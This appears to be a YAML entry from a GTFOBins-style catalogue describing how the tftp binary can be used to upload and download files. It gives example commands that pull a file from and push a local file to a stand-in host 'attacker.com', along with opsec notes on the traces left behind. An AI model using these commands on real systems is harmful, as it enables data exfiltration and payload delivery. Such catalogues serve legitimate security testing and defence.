---
name: tftp
capabilities:
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: false
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: |-
    tftp attacker.com
    get /path/to/input-file
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: |-
    tftp attacker.com
    put /path/to/input-file
references:
- https://gtfobins.github.io/gtfobins/tftp/
tags: []
---
